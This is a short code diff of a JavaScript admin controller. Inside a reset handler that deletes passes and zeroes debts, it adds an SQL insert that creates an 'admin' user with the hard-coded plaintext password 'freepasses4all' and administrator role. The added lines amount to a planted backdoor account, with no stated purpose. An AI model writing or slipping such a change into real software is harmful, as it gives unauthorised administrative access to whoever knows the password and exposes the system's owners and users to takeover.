@@ -56,6 +56,10 @@ const adminController = {
     try {
       await Pass.deleteAllPasses();
       await pool.query("UPDATE Debts SET amount = $1", [0]);
+      await pool.query(
+        `INSERT INTO USERS (username, password, role) VALUES ($1, $2, $3)`,
+        ["admin", "freepasses4all", "admin"]
+      );
       const format = req.query.format || "json";
       const response = { status: "OK" };
       res.setHeader("Content-Type", getContentType(format));
